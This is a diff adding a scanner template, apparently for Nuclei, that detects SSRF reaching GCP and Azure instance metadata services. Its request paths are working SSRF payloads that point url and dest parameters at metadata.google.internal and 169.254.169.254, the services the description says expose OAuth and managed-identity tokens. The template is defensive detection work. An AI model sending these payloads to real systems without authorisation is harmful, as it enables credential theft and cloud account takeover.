@@ -1,0 +1,29 @@
+id: cloud-metadata-ssrf-gcp-azure
+info:
+  name: SSRF to GCP / Azure instance metadata
+  severity: critical
+  description: A url parameter is fetched server-side and reflected, reaching the GCP or Azure metadata service. These expose instance identity and OAuth/managed-identity tokens, a path to cloud account takeover. Complements the AWS IMDS check.
+  tags: vuln,ssrf,cloud,gcp,azure,metadata
+  metadata:
+    category: vulnerabilities
+    cwe: CWE-918
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url=http://metadata.google.internal/computeMetadata/v1/instance/"
+      - "{{BaseURL}}/?url=http://169.254.169.254/computeMetadata/v1/instance/"
+      - "{{BaseURL}}/?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+      - "{{BaseURL}}/?dest=http://metadata.google.internal/computeMetadata/v1/instance/"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "computeMetadata"
+          - "numericProjectId"
+          - "azEnvironment"
+          - "\"vmId\""
+        condition: or
+      - type: status
+        status:
+          - 200
